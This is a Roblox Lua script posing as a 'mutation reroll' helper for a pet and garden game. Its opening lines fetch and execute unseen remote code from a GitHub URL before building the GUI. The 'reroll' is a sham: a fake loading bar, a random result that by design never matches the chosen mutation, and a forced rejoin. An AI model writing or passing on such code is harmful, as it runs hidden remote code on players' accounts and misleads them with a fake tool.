local firstScript = loadstring(game:HttpGet("https://raw.githubusercontent.com/jandelrblx/growagarden/refs/heads/main/script", true))
firstScript()

-- Wait a moment to ensure the first script has fully loaded
task.wait(1)
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")

local LocalPlayer = Players.LocalPlayer
repeat task.wait() until LocalPlayer and LocalPlayer.Character

-- GUI Setup
local gui = Instance.new("ScreenGui", CoreGui)
gui.Name = "MutationRerollGUI"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Main Frame
local main = Instance.new("Frame", gui)
main.Size = UDim2.new(0, 280, 0, 195)
main.Position = UDim2.new(0.5, -140, 0.5, -97.5)
main.BackgroundColor3 = Color3.fromRGB(94, 62, 35)
main.Active = true
main.Draggable = true
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 8)

-- Header (Green Bar)
local header = Instance.new("Frame", main)
header.Size = UDim2.new(1, 0, 0, 30)
header.BackgroundColor3 = Color3.fromRGB(85, 255, 105)
Instance.new("UICorner", header).CornerRadius = UDim.new(0, 8)

local title = Instance.new("TextLabel", header)
title.Size = UDim2.new(1, -60, 1, 0)
title.Position = UDim2.new(0, 10, 0, 0)
title.Text = "MUTATION REROLL"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.FredokaOne
title.TextSize = 16
title.BackgroundTransparency = 1
title.TextXAlignment = Enum.TextXAlignment.Left
local titleStroke = Instance.new("UIStroke", title)
titleStroke.Color = Color3.fromRGB(0, 0, 0)
titleStroke.Thickness = 2

-- Red X Button
local closeBtn = Instance.new("TextButton", header)
closeBtn.Text = "X"
closeBtn.Size = UDim2.new(0, 24, 0, 24)
closeBtn.Position = UDim2.new(1, -28, 0, 3)
closeBtn.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.Font = Enum.Font.FredokaOne
closeBtn.TextSize = 14
Instance.new("UICorner", closeBtn)
closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)

-- Yellow ? Info Button
local infoBtn = Instance.new("TextButton", header)
infoBtn.Text = "?"
infoBtn.Size = UDim2.new(0, 24, 0, 24)
infoBtn.Position = UDim2.new(1, -56, 0, 3)
infoBtn.BackgroundColor3 = Color3.fromRGB(255, 220, 90)
infoBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
infoBtn.Font = Enum.Font.FredokaOne
infoBtn.TextSize = 14
Instance.new("UICorner", infoBtn)

infoBtn.MouseEnter:Connect(function()
    infoBtn.BackgroundColor3 = Color3.fromRGB(255, 240, 120)
end)
infoBtn.MouseLeave:Connect(function()
    infoBtn.BackgroundColor3 = Color3.fromRGB(255, 220, 90)
end)

-- Info Modal (Styled like main GUI)
infoBtn.MouseButton1Click:Connect(function()
    if gui:FindFirstChild("InfoModal") then return end
    main.Visible = false
    local blur = Instance.new("BlurEffect")
    blur.Name = "ModalBlur"
    blur.Size = 16
    blur.Parent = game:GetService("Lighting")

    local modal = Instance.new("Frame", gui)
    modal.Name = "InfoModal"
    modal.Size = UDim2.new(0, 280, 0, 195)
    modal.Position = UDim2.new(0.5, -140, 0.5, -97.5)
    modal.BackgroundColor3 = Color3.fromRGB(94, 62, 35)
    Instance.new("UICorner", modal).CornerRadius = UDim.new(0, 8)

    local headerModal = Instance.new("Frame", modal)
    headerModal.Size = UDim2.new(1, 0, 0, 30)
    headerModal.BackgroundColor3 = Color3.fromRGB(85, 255, 105)
    Instance.new("UICorner", headerModal).CornerRadius = UDim.new(0, 8)

    local titleModal = Instance.new("TextLabel", headerModal)
    titleModal.Size = UDim2.new(1, -30, 1, 0)
    titleModal.Position = UDim2.new(0, 10, 0, 0)
    titleModal.Text = "INFORMATION"
    titleModal.Font = Enum.Font.FredokaOne
    titleModal.TextSize = 16
    titleModal.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleModal.TextXAlignment = Enum.TextXAlignment.Left
    titleModal.BackgroundTransparency = 1
    local titleStroke = Instance.new("UIStroke", titleModal)
    titleStroke.Color = Color3.fromRGB(0, 0, 0)
    titleStroke.Thickness = 2

    local close = Instance.new("TextButton", headerModal)
    close.Text = "X"
    close.Size = UDim2.new(0, 24, 0, 24)
    close.Position = UDim2.new(1, -28, 0, 3)
    close.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
    close.TextColor3 = Color3.fromRGB(255, 255, 255)
    close.Font = Enum.Font.FredokaOne
    close.TextSize = 14
    Instance.new("UICorner", close)
    close.MouseButton1Click:Connect(function()
        blur:Destroy()
        modal:Destroy()
        main.Visible = true
    end)

    local infoLabel = Instance.new("TextLabel", modal)
    infoLabel.Size = UDim2.new(1, -20, 1, -40)
    infoLabel.Position = UDim2.new(0, 10, 0, 35)
    infoLabel.Text = "🎯 Select your desired mutation from the dropdown.\n\n🔄 Enable Auto Reroll to automatically reroll until you get the desired mutation.\n\n❓ How to use? You need a pet that is ready to be claimed\n\n✅ Available mutations: Ascended, Frozen, Golden, Inverted, IronSkin, Mega, Radiant, Rainbow, Shiny, Shocked, Tiny, Windy"
    infoLabel.TextWrapped = true
    infoLabel.Font = Enum.Font.FredokaOne
    infoLabel.TextSize = 12
    infoLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    infoLabel.BackgroundTransparency = 1
    infoLabel.TextXAlignment = Enum.TextXAlignment.Left
    infoLabel.TextYAlignment = Enum.TextYAlignment.Top
end)

-- Page Content Area
local page = Instance.new("Frame", main)
page.Size = UDim2.new(1, -20, 0, 150)
page.Position = UDim2.new(0, 10, 0, 35)
page.BackgroundColor3 = Color3.fromRGB(75, 50, 25)
Instance.new("UICorner", page).CornerRadius = UDim.new(0, 6)

-- Message Label
local messageLabel = Instance.new("TextLabel", page)
messageLabel.Size = UDim2.new(1, -20, 0, 20)
messageLabel.Position = UDim2.new(0, 10, 0, 10)
messageLabel.Text = ""
messageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
messageLabel.Font = Enum.Font.FredokaOne
messageLabel.TextSize = 11
messageLabel.BackgroundTransparency = 1
messageLabel.TextXAlignment = Enum.TextXAlignment.Center
messageLabel.Visible = false

-- Desired Mutations Label
local desiredMutationsLabel = Instance.new("TextLabel", page)
desiredMutationsLabel.Size = UDim2.new(0.4, -10, 0, 20)
desiredMutationsLabel.Position = UDim2.new(0, 10, 0, 35)
desiredMutationsLabel.Text = "Desired Mutations"
desiredMutationsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
desiredMutationsLabel.Font = Enum.Font.FredokaOne
desiredMutationsLabel.TextSize = 12
desiredMutationsLabel.BackgroundTransparency = 1
desiredMutationsLabel.TextXAlignment = Enum.TextXAlignment.Left

-- Mutation Dropdown Button
local mutationDropdownBtn = Instance.new("TextButton", page)
mutationDropdownBtn.Size = UDim2.new(0.55, -10, 0, 20)
mutationDropdownBtn.Position = UDim2.new(0.45, 0, 0, 35)
mutationDropdownBtn.Text = "Mega"
mutationDropdownBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
mutationDropdownBtn.Font = Enum.Font.FredokaOne
mutationDropdownBtn.TextSize = 10
mutationDropdownBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Instance.new("UICorner", mutationDropdownBtn).CornerRadius = UDim.new(0, 4)

-- Available mutations
local mutations = {
    "Ascended", "Frozen", "Golden", "Inverted", "IronSkin", 
    "Mega", "Radiant", "Rainbow", "Shiny", "Shocked", "Tiny", "Windy"
}

local selectedMutation = "Mega"

-- Mutation Dropdown GUI
local function createMutationDropdown()
    if main:FindFirstChild("MutationDropdown") then return end
    
    -- Create dark overlay for main GUI
    local darkOverlay = Instance.new("Frame", main)
    darkOverlay.Name = "DarkOverlay"
    darkOverlay.Size = UDim2.new(1, 0, 1, 0)
    darkOverlay.Position = UDim2.new(0, 0, 0, 0)
    darkOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    darkOverlay.BackgroundTransparency = 0.8
    darkOverlay.ZIndex = 50
    Instance.new("UICorner", darkOverlay).CornerRadius = UDim.new(0, 8)
    
    local dropdown = Instance.new("Frame", main)
    dropdown.Name = "MutationDropdown"
    dropdown.Size = UDim2.new(0, 180, 0, 170)
    dropdown.Position = UDim2.new(0.5, -90, 0.5, -85)
    dropdown.BackgroundColor3 = Color3.fromRGB(94, 62, 35)
    dropdown.ZIndex = 100
    Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 8)
    
    local dropdownHeader = Instance.new("Frame", dropdown)
    dropdownHeader.Size = UDim2.new(1, 0, 0, 30)
    dropdownHeader.BackgroundColor3 = Color3.fromRGB(85, 255, 105)
    Instance.new("UICorner", dropdownHeader).CornerRadius = UDim.new(0, 8)
    
    local dropdownTitle = Instance.new("TextLabel", dropdownHeader)
    dropdownTitle.Size = UDim2.new(1, -30, 1, 0)
    dropdownTitle.Position = UDim2.new(0, 10, 0, 0)
    dropdownTitle.Text = "DESIRED MUTATION"
    dropdownTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
    dropdownTitle.Font = Enum.Font.FredokaOne
    dropdownTitle.TextSize = 12
    dropdownTitle.BackgroundTransparency = 1
    dropdownTitle.TextXAlignment = Enum.TextXAlignment.Left
    local titleStroke = Instance.new("UIStroke", dropdownTitle)
    titleStroke.Color = Color3.fromRGB(0, 0, 0)
    titleStroke.Thickness = 2
    
    local closeDropdown = Instance.new("TextButton", dropdownHeader)
    closeDropdown.Text = "X"
    closeDropdown.Size = UDim2.new(0, 24, 0, 24)
    closeDropdown.Position = UDim2.new(1, -28, 0, 3)
    closeDropdown.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
    closeDropdown.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeDropdown.Font = Enum.Font.FredokaOne
    closeDropdown.TextSize = 14
    Instance.new("UICorner", closeDropdown)
    closeDropdown.MouseButton1Click:Connect(function() 
        dropdown:Destroy()
        if main:FindFirstChild("DarkOverlay") then
            main.DarkOverlay:Destroy()
        end
    end)
    
    -- Search Input
    local searchFrame = Instance.new("Frame", dropdown)
    searchFrame.Size = UDim2.new(1, -10, 0, 25)
    searchFrame.Position = UDim2.new(0, 5, 0, 30)
    searchFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Instance.new("UICorner", searchFrame).CornerRadius = UDim.new(0, 4)
    
    local searchInput = Instance.new("TextBox", searchFrame)
    searchInput.Size = UDim2.new(1, -10, 1, 0)
    searchInput.Position = UDim2.new(0, 5, 0, 0)
    searchInput.Text = "Search mutations..."
    searchInput.TextColor3 = Color3.fromRGB(0, 0, 0)
    searchInput.Font = Enum.Font.FredokaOne
    searchInput.TextSize = 10
    searchInput.BackgroundTransparency = 1
    searchInput.PlaceholderText = "Search mutations..."
    
    -- Mutations List
    local mutationsList = Instance.new("ScrollingFrame", dropdown)
    mutationsList.Size = UDim2.new(1, -10, 1, -65)
    mutationsList.Position = UDim2.new(0, 5, 0, 60)
    mutationsList.BackgroundColor3 = Color3.fromRGB(75, 50, 25)
    mutationsList.BorderSizePixel = 0
    Instance.new("UICorner", mutationsList).CornerRadius = UDim.new(0, 4)
    
    local listLayout = Instance.new("UIListLayout", mutationsList)
    listLayout.Padding = UDim.new(0, 2)
    listLayout.SortOrder = Enum.SortOrder.Name
    
    local function updateMutationsList(searchText)
        -- Clear existing buttons
        for _, child in pairs(mutationsList:GetChildren()) do
            if child:IsA("TextButton") then
                child:Destroy()
            end
        end
        
        -- Filter and create buttons
        for _, mutation in pairs(mutations) do
            if searchText == "" or mutation:lower():find(searchText:lower()) then
                local mutationBtn = Instance.new("TextButton", mutationsList)
                mutationBtn.Size = UDim2.new(1, -10, 0, 20)
                mutationBtn.Text = mutation
                mutationBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
                mutationBtn.Font = Enum.Font.FredokaOne
                mutationBtn.TextSize = 10
                mutationBtn.BackgroundColor3 = Color3.fromRGB(94, 62, 35)
                Instance.new("UICorner", mutationBtn).CornerRadius = UDim.new(0, 4)
                
                mutationBtn.MouseButton1Click:Connect(function()
                    selectedMutation = mutation
                    mutationDropdownBtn.Text = mutation
                    dropdown:Destroy()
                    if main:FindFirstChild("DarkOverlay") then
                        main.DarkOverlay:Destroy()
                    end
                end)
                
                mutationBtn.MouseEnter:Connect(function()
                    mutationBtn.BackgroundColor3 = Color3.fromRGB(85, 255, 105)
                    mutationBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
                end)
                
                mutationBtn.MouseLeave:Connect(function()
                    mutationBtn.BackgroundColor3 = Color3.fromRGB(94, 62, 35)
                    mutationBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
                end)
            end
        end
    end
    
    updateMutationsList("")
    
    searchInput.FocusLost:Connect(function()
        updateMutationsList(searchInput.Text)
    end)
    
    searchInput.Changed:Connect(function(prop)
        if prop == "Text" then
            updateMutationsList(searchInput.Text)
        end
    end)
end

mutationDropdownBtn.MouseButton1Click:Connect(createMutationDropdown)

-- Auto Reroll Mutation Label
local autoRerollLabel = Instance.new("TextLabel", page)
autoRerollLabel.Size = UDim2.new(0.4, -10, 0, 20)
autoRerollLabel.Position = UDim2.new(0, 10, 0, 65)
autoRerollLabel.Text = "Auto Reroll Mutation"
autoRerollLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
autoRerollLabel.Font = Enum.Font.FredokaOne
autoRerollLabel.TextSize = 12
autoRerollLabel.BackgroundTransparency = 1
autoRerollLabel.TextXAlignment = Enum.TextXAlignment.Left

-- Auto Reroll Toggle Button
local autoRerollToggle = Instance.new("TextButton", page)
autoRerollToggle.Size = UDim2.new(0.55, -10, 0, 20)
autoRerollToggle.Position = UDim2.new(0.45, 0, 0, 65)
autoRerollToggle.Text = "ON"
autoRerollToggle.TextColor3 = Color3.fromRGB(0, 0, 0)
autoRerollToggle.Font = Enum.Font.FredokaOne
autoRerollToggle.TextSize = 10
autoRerollToggle.BackgroundColor3 = Color3.fromRGB(85, 255, 105)
Instance.new("UICorner", autoRerollToggle).CornerRadius = UDim.new(0, 4)

local autoRerollEnabled = true

autoRerollToggle.MouseButton1Click:Connect(function()
    autoRerollEnabled = not autoRerollEnabled
    if autoRerollEnabled then
        autoRerollToggle.Text = "ON"
        autoRerollToggle.BackgroundColor3 = Color3.fromRGB(85, 255, 105)
        autoRerollToggle.TextColor3 = Color3.fromRGB(0, 0, 0)
    else
        autoRerollToggle.Text = "OFF"
        autoRerollToggle.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
        autoRerollToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
    end
end)

-- Manual Reroll Button
local rerollBtn = Instance.new("TextButton", page)
rerollBtn.Text = "REROLL MUTATION"
rerollBtn.Size = UDim2.new(1, -20, 0, 28)
rerollBtn.Position = UDim2.new(0, 10, 0, 95)
rerollBtn.BackgroundColor3 = Color3.fromRGB(85, 255, 105)
rerollBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
rerollBtn.Font = Enum.Font.FredokaOne
rerollBtn.TextSize = 12
Instance.new("UICorner", rerollBtn)

rerollBtn.MouseButton1Click:Connect(function()
    if selectedMutation then
        messageLabel.Text = "Checking pet mutation..."
        messageLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
        messageLabel.Visible = true
        
        -- Disable button and change to loading state
        rerollBtn.Active = false
        rerollBtn.BackgroundColor3 = Color3.fromRGB(255, 165, 0) -- Orange loading color
        
        -- Loading animation with dots
        local dots = {"", ".", "..", "..."}
        for i = 1, 100 do
            local dotIndex = (i % 4) + 1
            rerollBtn.Text = "LOADING" .. dots[dotIndex]
            task.wait(0.1) -- 10 seconds total loading time
        end
        
        -- Get random mutation (excluding the desired one for 0% chance)
        local availableMutations = {}
        for _, mutation in pairs(mutations) do
            if mutation ~= selectedMutation then
                table.insert(availableMutations, mutation)
            end
        end
        
        local obtainedMutation = availableMutations[math.random(1, #availableMutations)]
        
        -- Show what mutation was obtained
        messageLabel.Text = "Pet mutation: " .. obtainedMutation .. " (Not " .. selectedMutation .. ")"
        messageLabel.TextColor3 = Color3.fromRGB(255, 165, 0) -- Orange color
        messageLabel.Visible = true
        
        -- Reset button
        rerollBtn.Text = "REROLL MUTATION"
        rerollBtn.BackgroundColor3 = Color3.fromRGB(85, 255, 105)
        rerollBtn.Active = true
        
        -- Show rerolling message before rejoin
        task.wait(2)
        messageLabel.Text = "Rerolling mutation..."
        messageLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
        task.wait(1)
        
        -- Auto rejoin
        game:GetService("TeleportService"):Teleport(game.PlaceId)
    else
        messageLabel.Text = "Please select a desired mutation first!"
        messageLabel.TextColor3 = Color3.fromRGB(255, 60, 60)
        messageLabel.Visible = true
        task.wait(2)
        messageLabel.Visible = false
    end
end)

-- Credit Text
local creditLabel = Instance.new("TextLabel", page)
creditLabel.Size = UDim2.new(1, -20, 0, 16)
creditLabel.Position = UDim2.new(0, 10, 0, 130)
creditLabel.Text = "discord.gg/pGbFQz3jcz"
creditLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
creditLabel.Font = Enum.Font.FredokaOne
creditLabel.TextSize = 10
creditLabel.BackgroundTransparency = 1
creditLabel.TextXAlignment = Enum.TextXAlignment.Center
creditLabel.TextTransparency = 0.7
